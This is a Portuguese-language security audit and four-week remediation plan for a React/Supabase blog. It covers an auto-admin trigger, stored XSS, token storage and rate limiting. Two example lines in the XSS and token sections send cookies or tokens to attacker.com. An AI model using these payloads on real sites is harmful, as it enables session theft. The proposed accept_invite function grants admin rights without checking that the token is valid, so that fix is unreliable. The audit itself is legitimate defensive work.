# 🚨 MAPA DE VULNERABILIDADES & PLANO DE AÇÃO

## 📍 Mapa de Vulnerabilidades por Módulo

```
┌─────────────────────────────────────────────────────────────────┐
│          ARQUITETURA - VULNERABILIDADES MAPEADAS                │
├─────────────────────────────────────────────────────────────────┤

FRONTEND (React/TypeScript)
├── src/pages/Post.tsx
│   ├── 🔴 [L126] dangerouslySetInnerHTML sem sanitização (XSS)
│   └── Status: CRÍTICA - Todo visitor pode ser explorado
│
├── src/contexts/AuthContext.tsx
│   ├── 🟡 [L40-50] Race condition em checkAdminRole()
│   ├── 🔴 [L32] localStorage token (XSS vulnerable)
│   ├── 🔴 Sem 2FA/MFA
│   ├── 🔴 Sem revogação forçada de sessão
│   └── 🟡 Sem session timeout
│
├── src/components/admin/RichTextEditor.tsx
│   ├── 🔴 [L60] addImage() sem validação de URL
│   ├── 🔴 addLink() sem validação de URL
│   └── Status: MÉDIA - Admin pode injetar links maliciosos
│
├── src/components/admin/PostForm.tsx
│   ├── ✅ Upload validation OK
│   ├── 🟡 Sem rate limiting
│   └── Status: BOA
│
└── src/components/NewsletterForm.tsx
    ├── 🟡 Email validation MUITO simples (includes '@')
    ├── 🟡 Sem double opt-in
    ├── 🔴 Sem rate limiting no submit
    └── Status: Spam risk

BACKEND (Supabase/PostgreSQL)
├── supabase/migrations/
│   ├── 20260316094654_...sql
│   │   ├── 🔴 [L7] Auto-admin trigger para novo user (!!!)
│   │   └── Status: CRÍTICA - Bypass completo de auditoria
│   │
│   ├── 20260217224603_...sql
│   │   ├── ✅ Storage policies OK
│   │   ├── 🟡 Newsletter sem validação (insert true)
│   │   └── Status: Email spam risk
│   │
│   ├── 20260323120000_...sql
│   │   ├── ✅ RLS policies bem feitas
│   │   ├── 🟡 Push subscriptions sem token validation
│   │   ├── 🟡 Audit logs não implementados
│   │   └── Status: MÉDIA
│   │
│   └── 20260323081953_...sql
│       ├── ✅ Site settings OK (read-only para público)
│       └── Status: BOA
│
├── Base de Dados
│   ├── 🔴 posts.content armazenado como HTML bruto
│   ├── 🟡 user_profiles.bio sem sanitização
│   ├── ✅ Triggers de timestamp OK
│   ├── ✅ Has_role() function com SECURITY DEFINER OK
│   └── 🔴 Sem audit_logs table
│
└── Auth
    ├── ✅ Supabase Auth (bcrypt password hashing)
    ├── ✅ JWT tokens
    ├── 🔴 Sem 2FA
    └── 🔴 Sem rate limiting de login attempts

INFRAESTRUTURA
├── .env variables
│   ├── ✅ VITE_SUPABASE_URL (public OK)
│   ├── ✅ VITE_SUPABASE_PUBLISHABLE_KEY (public OK)
│   └── 🔴 Sem .env.example para documentação
│
├── CORS
│   ├── 🟡 Verificar configuração (provável *:*)
│   └── Status: Precisa validação
│
└── Logging
    ├── 🟡 Apenas console.error (não salvos)
    ├── 🔴 Sem error tracking (Sentry, etc)
    └── Status: Monitoramento insuficiente

```

---

## 🔴 VULNERABILIDADES CRÍTICAS

### V1: Auto-Admin Trigger
**Severidade:** 🔴🔴🔴 CRÍTICA  
**Arquivo:** `supabase/migrations/20260316094654_3224bdbe-379b-4734-b305-0d8b553d2e43.sql`  
**Linhas:** ~7-18

**Código Vulnerável:**
```sql
CREATE TRIGGER on_auth_user_created_assign_admin
  AFTER INSERT ON auth.users
  FOR EACH ROW
  EXECUTE FUNCTION public.handle_new_user_admin_role();
```

**Impacto:**
- ❌ Qualquer pessoa que se regista EM QUALQUER LUGAR vira admin
- ❌ Acesso completo ao dashboard `/admin/dashboard`
- ❌ Criar/editar/deletar posts de qualquer pessoa
- ❌ Modificar settings do site
- ❌ Exportar emails de newsletter

**Teste:**
1. Abrir `/admin/register`
2. Registar novo email: `teste@fake.com` / `password123`
3. Ir para `/admin/login`
4. Fazer login com `teste@fake.com`
5. ✅ Acesso ao dashboard (BUG!)

**Solução Imediata (1h):**
```sql
-- 1. Backup BD
backup_db();

-- 2. Remover trigger
DROP TRIGGER on_auth_user_created_assign_admin ON auth.users;

-- 3. Remover users não autorizados
DELETE FROM user_roles
WHERE created_at > '2026-03-20' AND role = 'admin'
AND user_id NOT IN (
  SELECT id FROM auth.users 
  WHERE email IN ('seu-admin@email.com', 'outro-admin@email.com')
);

-- 4. Criar sistema de aprovação
CREATE TABLE public.registration_invites (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  token TEXT UNIQUE NOT NULL,
  status TEXT CHECK (status IN ('pending', 'accepted')) DEFAULT 'pending',
  created_at TIMESTAMP DEFAULT now(),
  accepted_at TIMESTAMP
);

-- 5. Criar função para aceitar invite
CREATE OR REPLACE FUNCTION accept_invite(token_input TEXT, user_id_input UUID)
RETURNS BOOLEAN AS $$
BEGIN
  UPDATE registration_invites 
  SET status = 'accepted', accepted_at = now()
  WHERE token = token_input AND status = 'pending';
  
  INSERT INTO user_roles (user_id, role) 
  VALUES (user_id_input, 'admin');
  
  RETURN TRUE;
END;
$$ LANGUAGE plpgsql;
```

**Passo-a-Passo Longo (Frontend):**
1. Criar página `/admin/invites` (admin only)
2. Form para gerar convites (gerar token único)
3. Enviar email com link `/admin/register?token=xyz`
4. Na página de registro, validar token antes de criar admin role

---

### V2: XSS em Posts (dangerouslySetInnerHTML)
**Severidade:** 🔴🔴🔴 CRÍTICA  
**Arquivo:** `src/pages/Post.tsx`  
**Linha:** 126

**Código Vulnerável:**
```typescript
<div 
  className="prose prose-lg max-w-none text-foreground dark:prose-invert"
  dangerouslySetInnerHTML={{ __html: post.content }}
/>
```

**Impacto:**
- Admin injeta: `<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">`
- JavaScript roda para TODOS os visitors
- Roubo de session tokens
- Roubo de dados pessoais
- Redirecionamento para site phishing

**Teste de XSS:**
1. Admin cria post com conteúdo:
```html
<img src=x onerror="alert('XSS by admin')">
```
2. Visitor acessa post
3. alert() aparece (BUG!)

**Solução Imediata (2-3h):**
```bash
# 1. Instalar DOMPurify
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
// Em src/pages/Post.tsx
import DOMPurify from 'dompurify';

// Antes do render:
const cleanHTML = DOMPurify.sanitize(post.content, {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 'strike',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'blockquote', 'pre', 'code',
    'a', 'img',
    'ul', 'ol', 'li',
    'table', 'thead', 'tbody', 'tr', 'th', 'td'
  ],
  ALLOWED_ATTR: {
    'a': ['href', 'title', 'target'],
    'img': ['src', 'alt', 'title', 'width', 'height'],
    'code': ['class'],
  },
  KEEP_CONTENT: true,
  RETURN_DOM_FRAGMENT: false,
  RETURN_DOM: false,
});

// ✅ SEGURO: DOMPurify remove scripts
<div 
  className="prose prose-lg max-w-none text-foreground dark:prose-invert"
  dangerouslySetInnerHTML={{ __html: cleanHTML }}
/>
```

**Verificação após fix:**
1. Admin tenta injetar `<script>alert('xss')</script>`
2. Post renderiza: `&lt;script&gt;alert('xss')&lt;/script&gt;` (texto, não executa)
3. ✅ XSS neutralizado

---

### V3: Token em localStorage (XSS Vulnerable)
**Severidade:** 🔴🔴 ALTA  
**Arquivo:** `src/integrations/supabase/client.ts`

**Código Vulnerável:**
```typescript
export const supabase = createClient<Database>(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY,
  {
    auth: {
      storage: localStorage,  // ❌ Acessível via console.log
      persistSession: true,
      autoRefreshToken: true,
    }
  }
);
```

**Impacto:**
- Se houver XSS (veja V2), attacker faz:
  ```javascript
  // Console de browser comprometido
  localStorage.getItem('sb-token')  // → "eyJhbGc..."
  fetchAPI('https://attacker.com', { token })
  ```
- Attacker usa token para:
  - Fazer requisições como user
  - Criar posts falsos
  - Ver dados privados
  - Deletar tudo

**Solução Imediata (2-3h):**

**Opção 1: sessionStorage** (melhor que localStorage, mas não perfeito)
```typescript
auth: {
  storage: sessionStorage,  // Limpo ao fechar tab
  persistSession: false,     // Não persiste entre abas
  autoRefreshToken: true,
}
```

**Opção 2: HTTP-only Cookie + Service Worker** (ideal)
```typescript
// Supabase pode ser configurado com HTTP-only cookies
// Ver: https://supabase.com/docs/guides/auth/cookie-based-auth

auth: {
  domain: 'localhost',           // Seu domínio
  flow: 'pkce',                  // Authorization Code Flow
  storage: sessionStorage,       // Fallback
  storageKey: 'sb-token',
}
```

---

## 🟡 VULNERABILIDADES MÉDIAS

### V4: Race Condition em checkAdminRole()
**Severidade:** 🟡🟡 MÉDIA  
**Arquivo:** `src/contexts/AuthContext.tsx`  
**Linhas:** 40-50

**Problema:**
```typescript
if (session?.user) {
  setTimeout(() => {    // ⚠️ Não garante ordem!
    checkAdminRole(session.user.id).then(setIsAdmin);
  }, 0);
} else {
  setIsAdmin(false);
}
```

**Impacto:**
- Dashboard `/admin/dashboard` carregua ANTES de saber se é admin
- Pode renderizar conteúdo público por 100-200ms
- Leak de informação (admin vê menu antes de ser verificado)

**Solução Imediata (1h):**
```typescript
// Melhor: Esperar Promise inline
const checkAndSetAdmin = async (userId: string) => {
  const isAdmin = await checkAdminRole(userId);
  setIsAdmin(isAdmin);
};

useEffect(() => {
  supabase.auth.onAuthStateChange((event, session) => {
    setSession(session);
    setUser(session?.user ?? null);
    
    if (session?.user) {
      checkAndSetAdmin(session.user.id);  // ✅ Espera completion
    } else {
      setIsAdmin(false);
    }
    
    setIsLoading(false);
  });

  supabase.auth.getSession().then(({ data: { session } }) => {
    setSession(session);
    setUser(session?.user ?? null);
    
    if (session?.user) {
      checkAndSetAdmin(session.user.id);  // ✅ Espera completion
    }
    
    setIsLoading(false);
  });
}, []);
```

---

### V5: Newsletter sem Validação
**Severidade:** 🟡🟡 MÉDIA  
**Arquivo:** `supabase/migrations/20260217224603_...sql`

**RLS Vulnerável:**
```sql
CREATE POLICY "Anyone can subscribe to newsletter"
ON public.newsletter_subscribers FOR INSERT
WITH CHECK (true);  -- Sem validação!
```

**Impacto:**
- Spam: Insert 1 milhão de emails fake
- DDOS: Insert base64 gigante em email
- Vazamento: Enumerar emails válidos
- Hash cracking: Emails são UNIQUE, pode-se fazer força bruta

**Solução Imediata (3-4h):**

```sql
-- 1. Adicionar validation
CREATE POLICY "Anyone can subscribe to newsletter"
ON public.newsletter_subscribers FOR INSERT
WITH CHECK (
  email ~ '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$'  -- Regex email
  AND char_length(email) <= 254                                  -- RFC 5321
);

-- 2. Adicionar rate limiting (Edge Function)
-- supabase/functions/newsletter-subscribe/index.ts
// Limitar a 1 subscribe por IP a cada 5 minutos

-- 3. Adicionar double opt-in
CREATE TABLE newsletter_confirmations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT NOT NULL,
  token TEXT NOT NULL UNIQUE,
  expires_at TIMESTAMP DEFAULT now() + interval '24 hours',
  created_at TIMESTAMP DEFAULT now()
);

-- 4. Trigger para limpar expirados
CREATE OR REPLACE FUNCTION cleanup_expired_confirmations()
RETURNS void AS $$
BEGIN
  DELETE FROM newsletter_confirmations WHERE expires_at < now();
END;
$$ LANGUAGE plpgsql;

-- 5. Chamar cleanup via cron (pg_cron extension)
SELECT cron.schedule('cleanup-newsletter', '0 * * * *', 'SELECT cleanup_expired_confirmations()');
```

**Frontend:**
```typescript
// 1. Criar link de confirmação
const handleSubscribe = async (email: string) => {
  const { data, error } = await supabase
    .from('newsletter_confirmations')
    .insert({ email, token: generateToken() })
    .select()
    .single();
  
  // 2. Enviar email com link
  // POST /api/send-email
  // Link: /newsletter/confirm?token=xyz
  
  toast({ title: "Verifique seu email!" });
};

// 3. Confirmar subscription
const handleConfirm = async (token: string) => {
  const { data } = await supabase
    .from('newsletter_confirmations')
    .select('email')
    .eq('token', token)
    .single();
  
  if (!data || data.expires_at < new Date()) {
    return toast({ title: "Link expirado" });
  }
  
  await supabase
    .from('newsletter_subscribers')
    .insert({ email: data.email });
  
  await supabase
    .from('newsletter_confirmations')
    .delete()
    .eq('token', token);
  
  toast({ title: "Subscrito com sucesso!" });
};
```

---

### V6: Sem Rate Limiting
**Severidade:** 🟡🟡 MÉDIA  
**Risco:** Brute force, DDOS, spam

**Locais Vulneráveis:**
1. `/admin/login` - Brute force de password
2. `/admin/register` - Criar muitas contas
3. `/api/newsletter` - Spam de inscrições
4. Upload de imagens - Gigabytes

**Solução Imediata (4-5h):**

```typescript
// 1. Rate limit no login (Edge Function)
// supabase/functions/auth-rate-limit/index.ts

const RATE_LIMIT = {
  login: { requests: 5, window: 900 },      // 5 attempts/15min
  register: { requests: 3, window: 3600 },  // 3 attempts/hour
  newsletter: { requests: 10, window: 3600 }, // 10/hour
};

export const serveAsync = async (req: Request) => {
  const ip = req.headers.get('x-forwarded-for') || 'unknown';
  const endpoint = new URL(req.url).pathname;
  
  // Usar Upstash Redis para rate limiting
  const key = `${endpoint}:${ip}`;
  
  // ... implementar lógica de rate limit
};

// 2. Package rate limiting
npm install express-rate-limit  // Se usar server local
npm install @upstash/redis      // Para serverless (Supabase)

// 3. Implementar em Edge Function
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: Deno.env.get('UPSTASH_REDIS_REST_URL'),
  token: Deno.env.get('UPSTASH_REDIS_REST_TOKEN'),
});

async function checkRateLimit(ip: string, endpoint: string) {
  const key = `rate:${endpoint}:${ip}`;
  const count = await redis.incr(key);
  
  if (count === 1) {
    await redis.expire(key, 60); // 1 minuto window
  }
  
  return count <= 5; // Max 5 por minuto
}
```

---

## 📋 PLANO DE AÇÃO - 4 SEMANAS

### Semana 1: Críticas (Dias 1-5)
```
[DAY 1]
├── V1: Remover auto-admin trigger
│   ├── Drop trigger (30min)
│   ├── Remover admins não autorizados (30min)
│   ├── Criar registration_invites table (30min)
│   └── Test: Registar novo user, verificar se é regular user ✓
│
├── V2: Implementar DOMPurify
│   ├── npm install dompurify @types/dompurify (10min)
│   ├── Modificar src/pages/Post.tsx (30min)
│   ├── Adicionar sanitização em RichText (30min)
│   └── Test: Tentar XSS injection ✓
│
└── V3: Mover para sessionStorage
    ├── Atualizar client.ts (10min)
    ├── Teste de persistência entre abas (20min)
    └── Test: Session limpa ao fechar tab ✓

[DAY 2-3]
├── Fix V4: Race condition em auth
│   ├── Refactor checkAdminRole() (1h)
│   ├── Teste landing em isAdmin=true/false (30min)
│   └── Test: Dashboard acesso rápido ✓
│
├── Fix V5: Newsletter validation (2h)
│   ├── RLS policy update + regex (30min)
│   ├── Edge function rate limit (1h)
│   └── Test: Multiplas inscrições rejeitadas ✓
│
└── Fix V6: Rate limiting login (2h)
    ├── Edge function para /auth/login (1h)
    ├── Integração no AdminLogin.tsx (30min)
    └── Test: 5 tentativas bloqueiam ✓

[DAY 4-5]
├── Security testing
│   ├── Manual XSS tests (30min)
│   ├── SQL injection tests (30min)
│   ├── Auth bypass tests (30min)
│   └── All PASS ✓
│
└── Deploy críticas
    ├── Database migration (30min)
    ├── Frontend deploy (30min)
    ├── Rollback plan (30min)
    └── Monitor logs (1h)
```

**Deliverables Semana 1:**
- ✅ Sem auto-admin
- ✅ Sem XSS em posts  
- ✅ Email/password rate limited
- ✅ HTML sanitizado

---

### Semana 2: Médias (Dias 6-10)
```
[DAY 6-7]
├── Newsletter double opt-in (2 days)
│   ├── DB schema: newsletter_confirmations (1h)
│   ├── Edge function: send-email (2h)
│   ├── Frontend confirmation flow (2h)
│   ├── Email template (1h)
│   └── Test: E2E confirmation ✓
│
└── Session timeout (1 day)
    ├── Implementar inactivity timer (1h)
    ├── Logout automático (30min)
    ├── Refresh token rotation (1h)
    └── Test: Session expira em 30min ✓

[DAY 8-9]
├── Audit logging (2 days)
│   ├── DB: audit_logs table + trigger (2h)
│   ├── Log posts CRUD (1h)
│   ├── Log admin login/logout (1h)
│   ├── Admin dashboard para logs (2h)
│   └── Test: Ver logs de ações ✓
│
└── Input validation layer (1 day)
    ├── Validação de slug (30min)
    ├── Validação de titulo (30min)
    ├── Validação de excerpt (30min)
    └── Test: Inputs inválidos rejeitados ✓

[DAY 10]
├── Testing completo
│   ├── XSS payload testing (1h)
│   ├── SQL injection testing (1h)
│   ├── Auth flow testing (1h)
│   └── All PASS ✓
│
└── Deploy semana 2
    ├── Database migrations (30min)
    ├── Frontend deploy (30min)
    └── Monitor 2h ✓
```

**Deliverables Semana 2:**
- ✅ Newsletter double opt-in
- ✅ Session timeout 30min
- ✅ Audit logs funcional
- ✅ Input validation completa

---

### Semana 3: Roadmap (Dias 11-15)
```
[DAY 11-12]
├── Multi-role system (2 days)
│   ├── Estender AuthContext com array de roles (2h)
│   ├── Criar hook usePermission() (1h)
│   ├── ProtectedRoute por role (1h)
│   ├── Test: Diferentes roles com acesso diferente ✓
│
└── Dashboard por role (3h)
    ├── Dashboard admin (nova)
    ├── Dashboard editor (novo)
    └── Dashboard redator (novo)

[DAY 13-14]
├── 2FA (TOTP) (2 days)
│   ├── npm install @supabase/gotrue-js speakeasy (30min)
│   ├── Setup 2FA em auth flow (3h)
│   ├── Generate QR code (1h)
│   ├── Verify TOTP code (1h)
│   └── Test: 2FA em admin account ✓
│
└── Admin approval system (1 day)
    ├── Dashboard para aprovar registos (2h)
    ├── Email de aprovação (1h)
    └── Test: Admin aprova, user vira admin ✓

[DAY 15]
├── Permission matrix (1 day)
│   ├── DB: permissions table (1h)
│   ├── Admin UI para manage permissions (2h)
│   └── Test: Roles com permissões específicas ✓
│
└── Deploy semana 3
    ├── Database migrations (1h)
    ├── Frontend deploy (30min)
    └── Monitor ✓
```

**Deliverables Semana 3:**
- ✅ Multi-role ACL funcional
- ✅ 2FA ativável
- ✅ Admin approval workflow
- ✅ Permission matrix

---

### Semana 4: Testes & Deploy (Dias 16-20)
```
[DAY 16-17]
├── Testes de segurança (Security Audit)
│   ├── Manual penetration testing (4h)
│   ├── Automated OWASP scanning (2h)
│   ├── Code review (2h)
│   ├── Bugs encontrados? Fix + retest ✓
│
└── Testes de performance
    ├── Load testing (1h)
    ├── Database query optimization (2h)
    └── Benchmark completo ✓

[DAY 18]
├── Documentation
│   ├── API docs (2h)
│   ├── Security guidelines (1h)
│   ├── Deployment playbook (1h)
│   ├── Incident response procedures (1h)
│
└── Staging deploy
    ├── Deploy em staging (1h)
    ├── Final testing (2h)
    └── All PASS ✓

[DAY 19-20]
├── Production deploy
│   ├── Database migration (1h)
│   ├── Frontend deploy (30min)
│   ├── Monitor 1h (look for errors)
│   ├── Rollback ready ✓
│
├── Post-deploy
│   ├── Monitor logs 4h
│   ├── User feedback (2h)
│   ├── Performance metrics (1h)
│
└── Handoff & docs
    ├── Team training (2h)
    ├── Update wiki (1h)
    └── Review complete ✓
```

**Deliverables Semana 4:**
- ✅ Security audit completa
- ✅ Performance benchmarked
- ✅ Deployed para produção
- ✅ Documentation completa

---

## 📊 Resumo por Severidade

```
🔴 CRÍTICAS (Fazer esta semana):
├── V1: Auto-admin trigger removal       [1 dia]
├── V2: XSS sanitization (DOMPurify)    [1 dia]
├── V3: Token storage seguro             [1 dia]
└── V4: Race condition fix                [0.5 dia]

🟡 MÉDIAS (Próximas 2 semanas):
├── V5: Newsletter validation             [1.5 dias]
├── V6: Rate limiting                     [1.5 dias]
├── V7: Double opt-in newsletter          [2 dias]
├── V8: Session timeout                   [1 dia]
└── V9: Audit logging                     [2 dias]

🟢 ROADMAP (Mês que vem):
├── Multi-role system                     [2 dias]
├── 2FA/TOTP                              [2 dias]
├── Permission matrix                     [1.5 dias]
├── Admin approval flow                   [1.5 dias]
└── API public documentation              [2 dias]
```

---

## 🚀 Checklist Pre-Deploy

### Antes de cada push:
- [ ] Todos os console.log removidos
- [ ] Sem hardcoded passwords
- [ ] RLS policies testadas
- [ ] XSS payloads rejeitados
- [ ] SQL injection testadas
- [ ] CORS headers configurados
- [ ] .env configurado
- [ ] Database backup feito

### Antes de "Go Live":
- [ ] Load test OK
- [ ] Security audit OK
- [ ] Team treinado
- [ ] Documentation atualizada
- [ ] Incident response ready
- [ ] Monitoring alertas configurados
- [ ] Rollback procedure tested
- [ ] Stakeholders notificados

